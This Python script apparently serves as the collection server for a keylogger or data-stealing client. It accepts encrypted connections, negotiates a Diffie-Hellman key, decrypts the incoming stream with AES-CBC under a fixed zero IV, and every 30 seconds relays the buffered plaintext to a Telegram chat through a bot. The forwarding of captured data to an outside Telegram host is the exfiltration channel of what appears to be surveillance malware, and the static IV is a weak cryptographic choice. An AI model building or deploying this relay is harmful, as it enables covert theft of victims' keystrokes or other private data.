# NECESSARY
# pip install pycryptodome python-telegram-bot
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import threading
import time
from telegram import Bot
import os
import asyncio
from Crypto.Hash import SHA256
from Crypto.Util.number import bytes_to_long, long_to_bytes
import random

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# === LOAD TELEGRAM CONFIG FROM FILE ===
def load_telegram_config(path=None):
    if path is None:
        path = os.path.join(os.path.dirname(__file__), "../../Telegram.cfg")
    token = None
    chat_id = None
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            if "bot token:" in line:
                token = line.split("bot token:")[1].strip()
            elif "chat id:" in line:
                chat_id = line.split("chat id:")[1].strip()
    if not token or not chat_id:
        raise ValueError("Telegram token or chat id not found in config file.")
    return token, chat_id

TELEGRAM_TOKEN, TELEGRAM_CHAT_ID = load_telegram_config()
bot = Bot(token=TELEGRAM_TOKEN)
log_buffer = []

HOST = '127.0.0.1'
PORT = 5000

def decrypt_data(data, session_key):
    # IV must match the client; here we use 16 zero bytes for simplicity
    iv = b'\x00' * 16
    cipher = AES.new(session_key, AES.MODE_CBC, iv)
    try:
        decrypted = unpad(cipher.decrypt(data), AES.block_size)
        return decrypted.decode(errors='ignore')
    except Exception as e:
        return f"[DECRYPT ERROR] {e}\n"

def send_buffer_periodically():
    while True:
        time.sleep(30)
        if log_buffer:
            try:
                message = ''.join(log_buffer)
                future = asyncio.run_coroutine_threadsafe(
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message or "[Empty]"),
                    loop
                )
                future.result()
                log_buffer.clear()
            except Exception as e:
                print(f"[TELEGRAM ERROR] {e}")

def diffie_hellman_exchange(conn):
    # Use the same p and g as the client
    p = int(
        "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
        "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
        "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
        "E485B576625E7EC6F44C42E9A63A3620FFFFFFFFFFFFFFFF", 16)
    g = 2

    priv = random.randint(2, p-2)
    pub = pow(g, priv, p)

    # Receive client's public key
    client_pub_len = int.from_bytes(conn.recv(2), 'big')
    client_pub = bytes_to_long(conn.recv(client_pub_len))

    # Send our public key
    pub_bytes = long_to_bytes(pub)
    conn.send(len(pub_bytes).to_bytes(2, 'big'))
    conn.send(pub_bytes)

    # Compute shared secret
    shared_secret = pow(client_pub, priv, p)
    shared_secret_bytes = long_to_bytes(shared_secret)
    session_key = SHA256.new(shared_secret_bytes).digest()[:16]
    return session_key

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((HOST, PORT))
                s.listen(1)
                print(f"Server in ascolto su {HOST}:{PORT}")

                while True:
                    print("In attesa di una connessione...")
                    conn, addr = s.accept()
                    with conn:
                        print(f"Connessione accettata da {addr}")
                        session_key = diffie_hellman_exchange(conn)
                        while True:
                            data = conn.recv(1024)
                            if not data:
                                print(f"Connessione chiusa da {addr}")
                                break
                            # Decrypt and print
                            decrypted = decrypt_data(data, session_key)
                            print(decrypted, end='', flush=True)
                            log_buffer.append(decrypted)
        except Exception as e:
            print(f"\n[ERRORE SERVER] {e}. Riavvio tra 2 secondi...")
            time.sleep(2)

if __name__ == "__main__":
    threading.Thread(target=loop.run_forever, daemon=True).start()
    threading.Thread(target=send_buffer_periodically, daemon=True).start()
    main()
